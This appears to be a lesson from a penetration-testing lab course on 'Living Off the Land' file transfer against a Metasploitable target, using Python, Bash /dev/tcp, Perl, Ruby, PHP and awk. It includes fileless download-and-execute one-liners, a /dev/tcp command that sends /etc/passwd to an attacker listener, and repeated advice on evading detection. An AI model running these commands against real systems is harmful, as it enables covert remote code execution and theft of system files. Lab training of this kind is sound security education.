# 🌿 Living Off the Land (LOL) Transfer — Step-by-Step Guide

> **What is it?** "Living Off the Land" means using tools that are **already installed** on the target machine — no downloading extra programs. If the target has Python, Perl, Ruby, PHP, or even just Bash, you can transfer files!

> **When to use?** When:
> - Target has no `wget`, `curl`, `nc`, `ftp`, or `scp`
> - You want to stay stealthy (no new tools = less suspicious)
> - You can run commands but can't install anything

---

## 📋 What You Need

| Item                         | Details                                      |
| ---------------------------- | -------------------------------------------- |
| **Kali IP**                  | `192.168.56.10`                              |
| **HTTP server running**      | `python3 -m http.server 8080` on Kali        |
| **Shell on target**          | Any command execution (SSH, web shell, etc.) |
| **No special tools needed!** | That's the whole point of LOL                |

---

## 🧠 The Idea

```
Normal Transfer:     wget http://kali/file    → needs wget installed
LOL Transfer:        python -c "download..."  → uses whatever's already there

The question is: What's already on the target?
```

### How to find what's available

```bash
# On the target, check what's installed
which python python3 perl ruby php wget curl nc ncat
```

---

## 🐍 Method 1: Python (Very Common on Linux)

### Python 2 (older systems like Metasploitable)

```bash
python -c "import urllib; urllib.urlretrieve('http://192.168.56.10:8080/test_file.txt', 'test_file.txt')"
```

### Python 3 (modern systems)

```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://192.168.56.10:8080/test_file.txt', 'test_file.txt')"
```

### Verify

```bash
cat test_file.txt
# Should show: "This is a test file from Kali"
```

> 💡 Python is one of the most commonly available languages on Linux targets!

---

## 🐍 Method 2: Python — Download and Execute (Fileless)

```bash
# Python 3 — download script and run it (no file saved)
python3 -c "import urllib.request; exec(urllib.request.urlopen('http://192.168.56.10:8080/test_script.sh').read())"
```

> ⚠️ This only works for Python scripts, not bash scripts. For bash scripts, pipe to bash instead.

---

## 🐚 Method 3: Bash /dev/tcp (No External Tools!)

> **This is powerful!** Bash itself can make network connections using the `/dev/tcp` device — no wget, curl, or netcat needed.

### Download a file

```bash
# Connect to Kali's HTTP server and download
exec 3<>/dev/tcp/192.168.56.10/8080
echo -e "GET /test_file.txt HTTP/1.0\r\nHost: 192.168.56.10\r\n\r\n" >&3
cat <&3 > response.txt
exec 3>&-
```

> **What this does:**
> - `exec 3<>/dev/tcp/...` = open a TCP connection (file descriptor 3)
> - `echo -e "GET..."` = send an HTTP request manually
> - `cat <&3` = read the response
> - `exec 3>&-` = close the connection

### Simpler version (raw TCP, not HTTP)

```bash
# First set up netcat listener on Kali
# On Kali: nc -lvnp 4444 < test_file.txt

# Then on target — receive the file using /dev/tcp
cat < /dev/tcp/192.168.56.10/4444 > received_file.txt
```

### Send a file using /dev/tcp

```bash
# On Kali: nc -lvnp 4444 > exfiltrated.txt

# On target — send file to Kali
cat /etc/passwd > /dev/tcp/192.168.56.10/4444
```

> 💡 This method leaves **almost no trace** — no external tools used!

---

## 💎 Method 4: Perl

```bash
# Download file using Perl
perl -e 'use LWP::Simple; getstore("http://192.168.56.10:8080/test_file.txt", "test_file.txt")'
```

### If LWP module is not available

```bash
# Perl using sockets (no extra modules needed)
perl -e '
use IO::Socket::INET;
my $sock = IO::Socket::INET->new(PeerAddr=>"192.168.56.10",PeerPort=>"8080",Proto=>"tcp");
print $sock "GET /test_file.txt HTTP/1.0\r\nHost: 192.168.56.10\r\n\r\n";
while(<$sock>){print}
' > test_file.txt
```

---

## 💎 Method 5: Ruby

```bash
# Download file using Ruby
ruby -e "require 'open-uri'; File.write('test_file.txt', URI.open('http://192.168.56.10:8080/test_file.txt').read)"
```

### Shorter version

```bash
ruby -e 'require "net/http"; File.write("test_file.txt", Net::HTTP.get(URI("http://192.168.56.10:8080/test_file.txt")))'
```

---

## 🐘 Method 6: PHP

```bash
# Download file using PHP
php -r "file_put_contents('test_file.txt', file_get_contents('http://192.168.56.10:8080/test_file.txt'));"
```

### PHP — download and execute

```bash
php -r "eval(file_get_contents('http://192.168.56.10:8080/script.php'));"
```

---

## 🔧 Method 7: awk (Yes, Even awk!)

```bash
# Download using awk (very obscure but works!)
awk 'BEGIN {
  inet = "/inet/tcp/0/192.168.56.10/8080"
  print "GET /test_file.txt HTTP/1.0\r\nHost: 192.168.56.10\r\n" |& inet
  while ((inet |& getline line) > 0) print line
}'
```

> This is extreme LOL — awk is almost always available!

---

## 🔍 How to Check What's Available on a Target

Run this quick check when you first get a shell:

```bash
# Quick check for common tools
echo "=== File Transfer Tools ===" 
for tool in wget curl nc ncat netcat python python3 perl ruby php awk scp sftp ftp tftp; do
    which $tool 2>/dev/null && echo "[+] Found: $tool"
done
echo "=== Bash /dev/tcp ==="
(echo > /dev/tcp/127.0.0.1/22) 2>/dev/null && echo "[+] /dev/tcp works" || echo "[-] /dev/tcp not available"
```

> 💡 **Pro tip**: Save this as a script and run it first thing after getting a shell!

---

## 🧠 Quick Reference Cheatsheet

| Language     | One-Liner Download Command                                                      |
| ------------ | ------------------------------------------------------------------------------- |
| **Python 2** | `python -c "import urllib; urllib.urlretrieve('URL', 'file')"`                  |
| **Python 3** | `python3 -c "import urllib.request; urllib.request.urlretrieve('URL', 'file')"` |
| **Perl**     | `perl -e 'use LWP::Simple; getstore("URL", "file")'`                            |
| **Ruby**     | `ruby -e "require 'open-uri'; File.write('file', URI.open('URL').read)"`        |
| **PHP**      | `php -r "file_put_contents('file', file_get_contents('URL'));"`                 |
| **Bash**     | `cat < /dev/tcp/IP/PORT > file`                                                 |

---

## ❗ Common Mistakes & Fixes

| Problem                     | Fix                                                    |
| --------------------------- | ------------------------------------------------------ |
| `python: command not found` | Try `python3` or check `which python*`                 |
| Perl module not found       | Use the raw sockets version instead of LWP             |
| `/dev/tcp` doesn't work     | Some shells don't support it — only works in `bash`    |
| Ruby/PHP not installed      | Try another language — Python and Perl are most common |
| Download gets HTTP headers  | You're reading raw HTTP — need to strip headers        |

---

## ⚖️ LOL Methods Ranked

| Method            | Availability   | Difficulty | Stealth       |
| ----------------- | -------------- | ---------- | ------------- |
| **Bash /dev/tcp** | High (if bash) | ⭐⭐ Medium  | ⭐⭐⭐ Very High |
| **Python**        | Very High      | ⭐ Easy     | ⭐⭐ High       |
| **Perl**          | High           | ⭐ Easy     | ⭐⭐ High       |
| **PHP**           | Medium         | ⭐ Easy     | ⭐⭐ High       |
| **Ruby**          | Low-Medium     | ⭐ Easy     | ⭐⭐ High       |
| **awk**           | Very High      | ⭐⭐⭐ Hard   | ⭐⭐⭐ Very High |

---

## ✅ Practice Checklist

- [ ] Check what tools are available on Metasploitable (run the checker script)
- [ ] Download a file using Python (`python` or `python3`)
- [ ] Download a file using Bash `/dev/tcp`
- [ ] Send a file back using `/dev/tcp`
- [ ] Try at least one more LOL method (Perl, Ruby, or PHP)
- [ ] Transfer and execute a script in memory (fileless)

---

> 🔙 **Previous**: [PowerShell & Windows Transfer](./07_powershell_windows_transfer.md)
> 🔙 **Back to**: [File Transfer Main Guide](./file_transfer.md)
